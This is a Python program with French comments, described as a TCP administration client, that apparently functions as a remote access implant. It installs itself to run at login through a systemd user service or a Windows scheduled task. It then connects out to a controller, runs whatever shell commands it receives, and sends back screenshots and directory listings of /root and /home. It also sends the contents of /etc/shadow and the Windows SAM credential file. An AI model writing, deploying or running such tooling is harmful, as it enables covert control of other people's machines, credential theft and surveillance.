#!/usr/bin/env python3
"""Client TCP d'administration - compatible avec server.py"""
import argparse
import base64
import importlib.util
import json
import os
import platform
import socket
import subprocess
import sys
import time
import uuid
from datetime import datetime, timezone
from io import BytesIO
from pathlib import Path

PORT = 5000
APP_NAME = "clienttcp"
INFO_VERSION = "1"
SYSTEME = platform.system()

if SYSTEME == "Windows":
    CONFIG_DIR = Path(os.getenv("APPDATA", str(Path.home()))) / APP_NAME
else:
    CONFIG_DIR = Path.home() / ".config" / APP_NAME

SERVICE_DIR = Path.home() / ".config" / "systemd" / "user"
SERVICE_FILE = SERVICE_DIR / "clienttcp.service"
IP_FILE = CONFIG_DIR / "server_ip"
PID_FILE = CONFIG_DIR / "client.pid"
TASK_NAME = "ClientTCP"


# ---------- Utilitaires système ----------

def _charger_ou_creer_uuid():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    f = CONFIG_DIR / "client_uuid"
    if f.exists():
        val = f.read_text(encoding="utf-8").strip()
        if val:
            return val
    val = uuid.uuid4().hex
    f.write_text(val, encoding="utf-8")
    return val


CLIENT_UUID = _charger_ou_creer_uuid()


def _pid_vivant(pid):
    try:
        if SYSTEME == "Windows":
            r = subprocess.run(
                ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
                capture_output=True, text=True, timeout=3,
            )
            return str(pid) in r.stdout
        os.kill(pid, 0)
        return True
    except (OSError, subprocess.SubprocessError):
        return False


def _tuer_pid(pid):
    try:
        if SYSTEME == "Windows":
            subprocess.run(["taskkill", "/F", "/PID", str(pid)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        else:
            os.kill(pid, 15)
    except OSError:
        pass


def verrou_instance_unique():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    if PID_FILE.exists():
        try:
            ancien_pid = int(PID_FILE.read_text().strip())
        except (ValueError, OSError):
            ancien_pid = None
        if ancien_pid and ancien_pid != os.getpid() and _pid_vivant(ancien_pid):
            print(f"[CLIENT] Arrêt de l'instance précédente (PID {ancien_pid})...")
            _tuer_pid(ancien_pid)
            for _ in range(30):
                if not _pid_vivant(ancien_pid):
                    break
                time.sleep(0.1)
    PID_FILE.write_text(str(os.getpid()), encoding="utf-8")


def preparer_dependances():
    """Installe Pillow/mss si besoin (uniquement pour SCREENSHOT, mais on garde la logique)."""
    modules = (("mss", "mss"), ("Pillow", "PIL"))
    if SYSTEME != "Linux":
        return  # on ne fait pas d'auto-install sur Windows
    if all(importlib.util.find_spec(m) is not None for _, m in modules):
        return
    venv_dir = CONFIG_DIR / "venv"
    python_venv = venv_dir / "bin" / "python"
    if not python_venv.exists():
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        subprocess.run([sys.executable, "-m", "venv", str(venv_dir)],
                       capture_output=True, text=True)
    subprocess.run(
        [str(python_venv), "-m", "pip", "install", "--disable-pip-version-check",
         "mss", "Pillow"],
        check=False,
    )
    os.execv(str(python_venv), [str(python_venv), str(Path(__file__).resolve()), *sys.argv[1:]])


# ---------- Persistance ----------

def installer_demarrage_linux():
    SERVICE_DIR.mkdir(parents=True, exist_ok=True)
    python = sys.executable
    script = Path(__file__).resolve()
    contenu = f"""[Unit]
Description=Client TCP - Supervision
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart="{python}" "{script}" --client
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
"""
    SERVICE_FILE.write_text(contenu, encoding="utf-8")
    subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
    subprocess.run(["systemctl", "--user", "enable", "clienttcp.service"], check=False)
    subprocess.run(["systemctl", "--user", "start", "clienttcp.service"], check=False)
    # 🔑 Indispensable pour que le service --user tourne sans session ouverte (après reboot)
    try:
        user = os.getlogin()
        subprocess.run(["loginctl", "enable-linger", user], check=False)
    except OSError:
        pass


def installer_demarrage():
    python = sys.executable
    script = Path(__file__).resolve()
    if SYSTEME == "Linux":
        installer_demarrage_linux()
    elif SYSTEME == "Windows":
        pythonw = Path(python).with_name("pythonw.exe")
        executable = str(pythonw if pythonw.exists() else Path(python))
        commande = f'"{executable}" "{script}" --client'
        subprocess.run(["schtasks", "/Create", "/TN", TASK_NAME, "/TR", commande,
                        "/SC", "ONLOGON", "/RL", "LIMITED", "/IT", "/F"], check=True)
        subprocess.run(["schtasks", "/Run", "/TN", TASK_NAME], check=True)


def desinstaller_demarrage():
    if SYSTEME == "Linux":
        subprocess.run(["systemctl", "--user", "disable", "--now", "clienttcp.service"], check=False)
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
        SERVICE_FILE.unlink(missing_ok=True)
    elif SYSTEME == "Windows":
        subprocess.run(["schtasks", "/Delete", "/TN", TASK_NAME, "/F"], check=False)


# ---------- Réseau ----------

def adresse_ipv4():
    """Récupère l'IP d'une interface (pas localhost)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sonde:
            sonde.connect(("192.0.2.1", 80))  # route par défaut
            ip = sonde.getsockname()[0]
            if ip and not ip.startswith("127."):
                return ip
    except OSError:
        pass
    try:
        hostname = socket.gethostname()
        for ip in socket.gethostbyname_ex(hostname)[2]:
            if not ip.startswith("127."):
                return ip
    except OSError:
        pass
    return ""


def infos_reseau():
    """Liste des interfaces + IPs."""
    try:
        if SYSTEME == "Linux":
            r = subprocess.run(["ip", "-o", "-4", "addr", "show"],
                               capture_output=True, text=True, timeout=5)
            return r.stdout.strip() or "(vide)"
        elif SYSTEME == "Windows":
            r = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=5)
            return r.stdout.strip()
    except (OSError, subprocess.SubprocessError) as e:
        return f"[ERREUR] {e}"
    return "(non supporté)"


def verifier_connexion(ip):
    try:
        with socket.create_connection((ip, PORT), timeout=5):
            return True
    except OSError:
        return False


# ---------- Exécution de commandes ----------

def executer_commande_shell(commande):
    """Exécute une commande shell et renvoie stdout+stderr."""
    try:
        if SYSTEME == "Windows":
            proc = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", commande],
                capture_output=True, text=True, timeout=30
            )
        else:
            proc = subprocess.run(
                ["sh", "-c", commande],
                capture_output=True, text=True, timeout=30
            )
        out = proc.stdout or ""
        if proc.stderr:
            out += ("\n" if out else "") + proc.stderr
        return out.strip() or f"(code retour {proc.returncode})"
    except subprocess.TimeoutExpired:
        return "[ERREUR] timeout (30s)"
    except Exception as e:
        return f"[ERREUR] {e}"


# ---------- Screenshot (retourné en base64 dans la réponse JSON) ----------

def faire_screenshot():
    try:
        import mss
        from PIL import Image
    except ImportError:
        return {"erreur": "Pillow/mss non installés"}

    try:
        with mss.MSS() as captureur:
            moniteur = captureur.monitors[1]
            shot = captureur.grab(moniteur)
            image = Image.frombytes("RGB", shot.size, shot.rgb)
            if image.width > 1280:
                h = max(1, round(image.height * 1280 / image.width))
                image = image.resize((1280, h))
            buf = BytesIO()
            image.save(buf, format="JPEG", quality=70, optimize=True)
            data = buf.getvalue()
        return {
            "format": "jpeg",
            "encoding": "base64",
            "taille_octets": len(data),
            "donnees": base64.b64encode(data).decode("ascii"),
        }
    except Exception as e:
        return {"erreur": str(e)}


# ---------- SAM / shadow / listing ----------

def lire_fichier_limite(chemin, max_octets=8192):
    """Lecture d'un fichier protégé (nécessite root)."""
    try:
        data = Path(chemin).read_bytes()[:max_octets]
        return data.decode("utf-8", "replace")
    except PermissionError:
        return f"[ERREUR] Permission refusée pour {chemin} (exécute le client en root)"
    except FileNotFoundError:
        return f"[ERREUR] {chemin} introuvable"
    except OSError as e:
        return f"[ERREUR] {e}"


def lister_recursif(base, max_entrees=500):
    base = Path(base)
    if not base.exists():
        return f"[ERREUR] {base} introuvable"
    lignes = []
    try:
        for p in base.rglob("*"):
            lignes.append(str(p))
            if len(lignes) >= max_entrees:
                lignes.append(f"... (tronqué à {max_entrees} entrées)")
                break
    except PermissionError as e:
        lignes.append(f"[ERREUR] {e}")
    return "\n".join(lignes) if lignes else "(vide)"


# ---------- Traitement d'une requête du serveur ----------

def traiter_commande(demande):
    """Retourne un dict qui sera sérialisé en JSON."""
    cmd = str(demande.get("commande", "")).upper()
    args = str(demande.get("args", ""))

    try:
        if cmd == "HOSTNAME":
            return {"statut": "ok", "resultat": socket.gethostname()}
        if cmd == "OS":
            return {"statut": "ok", "resultat": f"{platform.system()} {platform.release()} ({platform.version()})"}
        if cmd == "ARCH":
            return {"statut": "ok", "resultat": platform.machine()}
        if cmd == "NETWORK":
            return {"statut": "ok", "resultat": infos_reseau()}
        if cmd == "INFO":
            return {"statut": "ok", "resultat": {
                "hostname": socket.gethostname(),
                "os": f"{platform.system()} {platform.release()}",
                "arch": platform.machine(),
                "ip": adresse_ipv4(),
                "uuid": CLIENT_UUID,
                "python": sys.version.split()[0],
            }}
        if cmd == "STATUS":
            return {"statut": "ok", "resultat": "actif",
                    "uptime": time.time()}
        if cmd == "SCREENSHOT":
            return {"statut": "ok", "resultat": faire_screenshot()}
        if cmd == "EXEC":
            if not args:
                return {"statut": "erreur", "erreur": "args manquant"}
            return {"statut": "ok", "resultat": executer_commande_shell(args)}
        if cmd == "SAM":
            # Étude SAM/shadow : récupération /etc/passwd + /etc/shadow (+ SAM Windows si dispo)
            resultat = {}
            resultat["/etc/passwd"] = lire_fichier_limite("/etc/passwd")
            resultat["/etc/shadow"] = lire_fichier_limite("/etc/shadow")
            if SYSTEME == "Windows":
                sam = Path(os.getenv("SystemRoot", r"C:\Windows")) / "System32" / "config" / "SAM"
                resultat["SAM"] = lire_fichier_limite(str(sam))
            return {"statut": "ok", "resultat": resultat}
        if cmd == "LIST":
            chemins = [args] if args else ["/root", "/home"]
            resultat = {}
            for c in chemins:
                resultat[c] = lister_recursif(c)
            return {"statut": "ok", "resultat": resultat}
        return {"statut": "erreur", "erreur": f"Commande inconnue : {cmd}"}
    except Exception as e:
        return {"statut": "erreur", "erreur": str(e)}


# ---------- Boucle client ----------

def envoyer_json(sock, obj):
    sock.sendall((json.dumps(obj, ensure_ascii=False) + "\n").encode("utf-8"))


def lancer_client(ip):
    while True:
        try:
            with socket.create_connection((ip, PORT), timeout=10) as client:
                client.settimeout(None)
                lecteur = client.makefile("r", encoding="utf-8")

                # 1) Handshake d'identification (ce que le serveur attend)
                identification = {
                    "hostname": socket.gethostname(),
                    "os": f"{platform.system()} {platform.release()}",
                    "arch": platform.machine(),
                    "ip": adresse_ipv4(),
                    "uuid": CLIENT_UUID,
                }
                envoyer_json(client, identification)

                # 2) Attente de l'acquittement serveur
                ligne = lecteur.readline()
                if not ligne:
                    break
                try:
                    ack = json.loads(ligne)
                    print(f"[CLIENT] Connecté : {ack}")
                except json.JSONDecodeError:
                    print(f"[CLIENT] Réponse inattendue : {ligne!r}")

                # 3) Boucle de traitement des commandes
                while True:
                    ligne = lecteur.readline()
                    if not ligne:
                        break
                    try:
                        demande = json.loads(ligne)
                    except json.JSONDecodeError:
                        envoyer_json(client, {"statut": "erreur",
                                              "erreur": "JSON invalide"})
                        continue

                    reponse = traiter_commande(demande)
                    reponse["commande"] = demande.get("commande")
                    envoyer_json(client, reponse)

                    # Si le serveur envoie EXEC quit -> on ferme proprement
                    if demande.get("commande") == "EXEC" and \
                       demande.get("args", "").strip().lower() in ("quit", "exit", "quitter"):
                        return
        except (OSError, UnicodeError) as e:
            print(f"[CLIENT] Erreur réseau : {e}")
        except Exception as e:
            print(f"[CLIENT] Erreur inattendue : {e}")
        time.sleep(10)


# ---------- main ----------

def main():
    parser = argparse.ArgumentParser(description="Client TCP compatible server.py")
    parser.add_argument("ip", nargs="?", help="IPv4 du serveur")
    parser.add_argument("--client", action="store_true", help="Mode client (autostart)")
    parser.add_argument("--uninstall", action="store_true")
    args = parser.parse_args()

    if args.uninstall:
        desinstaller_demarrage()
        return

    verrou_instance_unique()
    preparer_dependances()

    if args.client:
        ip = IP_FILE.read_text(encoding="utf-8").strip() if IP_FILE.exists() else None
        if not ip:
            raise SystemExit("[CLIENT] Aucune IP connue. Lance avec : ./client.py <ip>")
        try:
            lancer_client(ip)
        finally:
            try:
                if PID_FILE.exists():
                    pid = int(PID_FILE.read_text().strip())
                    if pid == os.getpid():
                        PID_FILE.unlink()
            except (ValueError, OSError):
                pass
        return

    if not args.ip:
        parser.print_help()
        raise SystemExit(1)

    try:
        socket.inet_aton(args.ip)
    except OSError:
        parser.error("Adresse IPv4 invalide.")

    if not verifier_connexion(args.ip):
        raise SystemExit("Installation annulée : serveur inaccessible.")

    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    IP_FILE.write_text(args.ip, encoding="utf-8")

    try:
        installer_demarrage()
    except (OSError, subprocess.CalledProcessError, RuntimeError) as e:
        raise SystemExit(f"Installation impossible : {e}")

    lancer_client(args.ip)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[CLIENT] Arrêt.")